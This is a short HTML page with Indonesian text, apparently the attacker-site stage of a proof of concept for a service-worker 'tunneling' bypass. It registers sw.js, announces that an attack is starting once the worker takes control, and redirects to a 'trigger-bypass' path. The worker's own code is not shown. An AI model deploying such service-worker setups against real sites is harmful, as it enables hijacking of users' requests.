<!DOCTYPE html>
<html>

<head>
    <title>Situs A - SW Tunneling</title>
</head>

<body>
    <h3>Situs A (SW Tunneling)</h3>
    <p>Menyiapkan Service Worker...</p>

    <script>
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js').then(reg => {
                console.log("SW Registered dalam scope:", reg.scope);
            }).catch(err => {
                console.error("SW Gagal daftar:", err);
            });

            navigator.serviceWorker.addEventListener('controllerchange', () => {
                console.log("SW sudah memegang kendali penuh! Memulai serangan...");
                window.location.href = 'trigger-bypass';
            });
        }
    </script>
</body>

</html>
